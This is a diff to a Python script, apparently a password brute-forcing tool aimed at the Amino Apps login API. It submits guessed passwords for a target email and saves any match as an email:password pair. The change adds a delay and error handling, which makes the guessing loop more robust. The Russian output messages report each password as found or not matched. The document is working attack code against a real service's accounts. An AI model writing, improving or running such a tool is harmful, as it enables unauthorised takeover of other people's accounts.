@@ -29,17 +29,20 @@ def brute_email(password, email, authType):
 	jsonData = {'recaptcha_challenge':recaptcha_challenge,'recaptcha_version':recaptcha_version,'auth_type':0,'secret':password,authType:email}
 	while True:
 		r = requests.post('https://aminoapps.com/api/auth', json=jsonData, timeout=2.5)
+		time.sleep(0.5)
 		break
-
-	if 'nickname' in r.json()['result'] or 'title' in r.json()['result']:
-		passwordFound = open('password_result.txt','w+')
-		passwordFound.write(f'{email}:{password}\n')
-		passwordFound.close()
-		print(f'[S.W.M] -- > Пароль найден!\n\n[S.W.M] -- > Пароль: {str(password)}')
-		exit()
-	else:
+	try:
+		if 'nickname' in r.json()['result'] or 'title' in r.json()['result']:
+			passwordFound = open('password_result.txt','w+')
+			passwordFound.write(f'{email}:{password}\n')
+			passwordFound.close()
+			print(f'[S.W.M] -- > Пароль найден!\n\n[S.W.M] -- > Пароль: {str(password)}')
+			exit()
+		else:
+			print(f'[S.W.M] -- > Пароль не равен: {str(password)}')
+			return False
+	except KeyError:
 		print(f'[S.W.M] -- > Пароль не равен: {str(password)}')
-		return False
 
 
 def start_brute(auth_type):
